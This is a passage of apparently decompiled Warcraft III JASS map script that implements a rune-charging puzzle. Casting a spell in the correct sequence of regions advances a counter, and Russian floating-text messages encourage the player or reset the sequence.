call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4F() then
if B4E() then
set TF=8
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ET),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Мои поздравления. Готовтесь!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateNUnitsAtLoc(1,$6E303856,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(Ga),bj_UNIT_FACING)
call RemoveUnit(JX)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
endfunction
function B4H takes nothing returns nothing
set VS=CreateTrigger()
call DisableTrigger(VS)
call TriggerRegisterAnyUnitEventBJ(VS,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(VS,Condition(function B30))
call TriggerAddAction(VS,function B4G)
endfunction
function B4I takes nothing returns boolean
if not (GetSpellAbilityId()==$41305459) then
return false
endif
return true
endfunction
function B4J takes nothing returns boolean
if not (TF==1) then
return false
endif
return true
endfunction
function B4K takes nothing returns boolean
if not (RectContainsUnit(EV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4L takes nothing returns boolean
if not (TF==2) then
return false
endif
return true
endfunction
function B4M takes nothing returns boolean
if not (RectContainsUnit(ES,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4N takes nothing returns boolean
if not (TF==3) then
return false
endif
return true
endfunction
function B4O takes nothing returns boolean
if not (RectContainsUnit(ET,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4P takes nothing returns boolean
if not (TF==4) then
return false
endif
return true
endfunction
function B4Q takes nothing returns boolean
if not (RectContainsUnit(EP,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4R takes nothing returns boolean
if not (TF==5) then
return false
endif
return true
endfunction
function B4S takes nothing returns boolean
if not (RectContainsUnit(EU,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4T takes nothing returns boolean
if not (TF==6) then
return false
endif
return true
endfunction
function B4U takes nothing returns boolean
if not (RectContainsUnit(EQ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4V takes nothing returns boolean
if not (TF==7) then
return false
endif
return true
endfunction
function B4W takes nothing returns boolean
if not (RectContainsUnit(ER,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4X takes nothing returns nothing
if B4K() then
if B4J() then
set TF=2
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EV),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4M() then
if B4L() then
set TF=3
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ES),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4O() then
if B4N() then
set TF=4
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ET),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4Q() then
if B4P() then
set TF=5
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EP),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4S() then
if B4R() then
set TF=6
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EU),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4U() then
if B4T() then
set TF=7
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EQ),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4W() then
if B4V() then
set TF=8
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ER),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Мои поздравления. Готовтесь!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateNUnitsAtLoc(1,$6E303856,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(Ga),bj_UNIT_FACING)
call RemoveUnit(JX)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
endfunction
function B4Y takes nothing returns nothing
set VW=CreateTrigger()
call DisableTrigger(VW)
call TriggerRegisterAnyUnitEventBJ(VW,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(VW,Condition(function B4I))
call TriggerAddAction(VW,function B4X)
endfunction
function B4Z takes nothing returns boolean
if not (GetSpellAbilityId()==$41305459) then
return false
endif
return true
endfunction
function B4a takes nothing returns boolean
if not (TF==1) then
return false
endif
return true
endfunction
function B4b takes nothing returns boolean
if not (RectContainsUnit(EV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4c takes nothing returns boolean
if not (TF==2) then
return false
endif
return true
endfunction
function B4d takes nothing returns boolean
if not (RectContainsUnit(EP,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4e takes nothing returns boolean
if not (TF==3) then
return false
endif
return true
endfunction
function B4f takes nothing returns boolean
if not (RectContainsUnit(EQ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4g takes nothing returns boolean
if not (TF==4) then
return false
endif
return true
endfunction
function B4h takes nothing returns boolean
if not (RectContainsUnit(EU,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4i takes nothing returns boolean
if not (TF==5) then
return false
endif
return true
endfunction
function B4j takes nothing returns boolean
if not (RectContainsUnit(ES,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4k takes nothing returns boolean
if not (TF==6) then
return false
endif
return true
endfunction
function B4l takes nothing returns boolean
if not (RectContainsUnit(ET,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4m takes nothing returns boolean
if not (TF==7) then
return false
endif
return true
endfunction
function B4n takes nothing returns boolean
if not (RectContainsUnit(ER,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4o takes nothing returns nothing
if B4b() then
if B4a() then
set TF=2
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EV),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4d() then
if B4c() then
set TF=3
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EP),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4f() then
if B4e() then
set TF=4
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EQ),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4h() then
if B4g() then
set TF=5
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EU),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4j() then
if B4i() then
set TF=6
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ES),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4l() then
if B4k() then
set TF=7
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ET),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4n() then
if B4m() then
set TF=8
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ER),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Мои поздравления. Готовтесь!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateNUnitsAtLoc(1,$6E303856,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(Ga),bj_UNIT_FACING)
call RemoveUnit(JX)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
endfunction
function B4p takes nothing returns nothing
set VT=CreateTrigger()
call DisableTrigger(VT)
call TriggerRegisterAnyUnitEventBJ(VT,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(VT,Condition(function B4Z))
call TriggerAddAction(VT,function B4o)
endfunction
function B4q takes nothing returns boolean
if not (GetSpellAbilityId()==$41305459) then
return false
endif
return true
endfunction
function B4r takes nothing returns boolean
if not (TF==1) then
return false
endif
return true
endfunction
function B4s takes nothing returns boolean
if not (RectContainsUnit(EP,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4t takes nothing returns boolean
if not (TF==2) then
return false
endif
return true
endfunction
function B4u takes nothing returns boolean
if not (RectContainsUnit(ET,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4v takes nothing returns boolean
if not (TF==3) then
return false
endif
return true
endfunction
function B4w takes nothing returns boolean
if not (RectContainsUnit(ER,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4x takes nothing returns boolean
if not (TF==4) then
return false
endif
return true
endfunction
function B4y takes nothing returns boolean
if not (RectContainsUnit(EU,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4z takes nothing returns boolean
if not (TF==5) then
return false
endif
return true
endfunction
function B40 takes nothing returns boolean
if not (RectContainsUnit(ES,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B41 takes nothing returns boolean
if not (TF==6) then
return false
endif
return true
endfunction
function B42 takes nothing returns boolean
if not (RectContainsUnit(EV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B43 takes nothing returns boolean
if not (TF==7) then
return false
endif
return true
endfunction
function B44 takes nothing returns boolean
if not (RectContainsUnit(EQ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B45 takes nothing returns nothing
if B4s() then
if B4r() then
set TF=2
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EP),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4u() then
if B4t() then
set TF=3
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ET),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4w() then
if B4v() then
set TF=4
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ER),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4y() then
if B4x() then
set TF=5
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EU),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B40() then
if B4z() then
set TF=6
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ES),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B42() then
if B41() then
set TF=7
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EV),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
